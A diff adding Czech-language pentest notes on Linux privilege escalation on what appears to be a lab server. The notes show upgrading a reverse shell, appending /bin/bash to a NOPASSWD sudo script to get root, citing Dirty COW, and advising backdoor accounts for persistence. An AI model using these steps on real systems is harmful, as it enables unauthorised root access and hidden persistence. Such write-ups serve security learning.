@@ -1,0 +1,78 @@
+Po našem dumb reverse shellu můžeme zkusit zlepšit naši zkušenost a funkčnost
+Zkusíme najít python přes locate nebo find
+Python to má a můžeme použít python -c 'import pty;pty.spawn("/bin/bash")' na zlepšení shellu
+V téhle fázi můžeme vytvořit backdoor k serveru pokud nechceme opakovat všechny předchozí kroky
+A zkoušíme najít způsob jak získat root nebo sudoer group
+1) Dobrý začátek je sudo -l
+	-----------------------------------------------------------
+	User www-data may run the following commands on this host:
+	    (ALL) NOPASSWD: /usr/sbin/useradd
+	    (ALL) NOPASSWD: /var/www/penterepmail/utils/pass.sh
+	    (ALL) NOPASSWD: /var/www/penterepmail/utils/newalias.sh
+	-----------------------------------------------------------
+	sudo můžeme použít pro tyhle příkazy - bez hesla
+	Tak useradd je hezký mít sudo, ale abychom udělali roota z toho uživatele tak musíme změnit skupinu k ničemu
+	Vlastní skripty už jsou zajímavější cíl 
+	-----------------------------------------------------------
+	cat pass.sh
+	#!/bin/sh
+	cat /tmp/pass | passwd $1
+	-----------------------------------------------------------
+	cat newalias.sh
+	#!/bin/sh
+
+	echo $1: $1, \"\| php /var/www/penterepmail/plugins/websocket-client/incomming_email.php $1\" >> /etc/mail/aliases
+	-----------------------------------------------------------
+	Víceméně je mi jedno co v nich pokud nemám v plánu zachovat integritu serveru 
+	Důležité je abych do nich mohl psát 
+	-----------------------------------------------------------
+	ls -l
+	total 32
+	-rwxr-xr-x 1 www-data www-data 1015 2020-05-24 22:44 eshop_expedition.php
+	-rwxr-xr-x 1 www-data www-data  136 2020-08-05 20:08 newalias.sh
+	-rwxr-xr-x 1 www-data www-data   46 2020-11-22 01:31 pass.sh
+	-rwxr-xr-x 1 www-data www-data   47 2020-11-22 01:31 pass.sh.bak2
+	-rw-r--r-- 1 www-data www-data  651 2020-04-08 13:54 ping.php
+	-rw-r--r-- 1 www-data www-data  280 2020-04-08 13:54 replace.php
+	-rw-r--r-- 1 www-data www-data  329 2020-05-19 09:50 systeminfo.sh
+	-rwxr-xr-x 1 www-data www-data  415 2020-04-01 17:21 websocket_server.sh
+	-----------------------------------------------------------
+	Ale nemůžu, jen root může
+	Vim ani vi nefunguje kvůli dumb shellu 
+	Tak můžu zkusit echo 1 > pass.sh ( nebo newalias.sh je to jedno )
+	Success už vím jak do toho můžu něco napsat
+	Tak zkusíme zapnout bash přes script 
+	-----------------------------------------------------------
+	echo "#!/bin/sh /bin/bash" > pass.sh              
+	bash: !/bin/sh: event not found
+	-----------------------------------------------------------
+	No tak očividně nám to moc nepůjde celé přepsat
+	Ale nám nevadí když se ty 2 cmd předtím udělají takže můžeme použít append což je >> 
+	-----------------------------------------------------------
+	echo "/bin/bash" >> pass.sh 
+	-----------------------------------------------------------
+	A po zapnutí scriptu vše funguje normálně
+	Ale pokud k tomu ještě dáme sudo
+	-----------------------------------------------------------
+	sudo ./pass.sh
+	cat: /tmp/pass: No such file or directory
+	Enter new UNIX password: Retype new UNIX password: passwd: Authentication information cannot be recovered
+	passwd: password unchanged
+	root@penterepmail:~/penterepmail/utils#
+	-----------------------------------------------------------
+	A jsme root! 
+	Můžeme vytvořit vlastního roota a pak se přihlašovat přes ssh místo tohodle hloupýho shellu
+	
+2) Pokud by nám sudo -l nenašlo nic, můžeme zkusit prozkoumat linux
+	-----------------------------------------------------------
+	uname -r
+	2.6.24-16-generic
+	-----------------------------------------------------------
+	Tahle verze je kritická, protože dirty cow
+	A pokud stáhneme veřejný exploit ( protože jsem scriptkiddie ) zjistíme, že můžeme být root bez žádné práce ( Pokud si nenapíšeme exploit sami. V tom případě hodně práce ) 
+	Důležité je hlavně po změně roota vytvořit nového sudoera a vrátit starý passwd soubor, jinak po restartu
+	přestane fungovat server tak jak by měl ( Spálil jsem se ) 
+	Nebo změnit ve zdrojáku jméno na root a teoreticky by to mělo jít - každopádně hashe 
+	jsou normálně v etc/shadow, pro rl example bych určitě vrátil backup a vytvořil sudoera
+3) Z předchozího scanu víme, že tak 98% věci jsou zastaralé -> veřejné CVE xxxx-xxxx na local priv escalation 
+	To be continued
